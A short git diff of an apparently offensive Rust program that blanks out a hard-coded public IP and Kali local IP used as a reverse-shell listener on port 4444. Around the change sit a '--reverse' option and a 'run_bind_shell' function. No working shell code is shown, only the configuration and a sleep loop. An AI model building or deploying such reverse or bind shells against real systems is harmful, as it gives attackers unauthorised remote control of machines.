@@ -18,9 +18,9 @@ fn main() -> Result<(), Box<dyn Error>> {
     let args: Vec<String> = env::args().collect();
     
     // TU IP PÚBLICA y PUERTO
-    let public_ip = "190.134.212.212";  // TU IP PÚBLICA
-    let kali_local_ip = "192.168.1.12";  // IP LOCAL 
-    let port = 4444;
+    let public_ip = " ";  // IP PÚBLICA
+    let kali_local_ip = " ";  // IP LOCAL 
+    let port = 4444; // MODIFICAR PUERTO
     
     if args.len() >= 4 && args[1] == "--reverse" {
         // Con IP personalizada
@@ -194,4 +194,5 @@ fn run_bind_shell() {
     loop {
         std::thread::sleep(std::time::Duration::from_secs(3600));
     }
+
 }
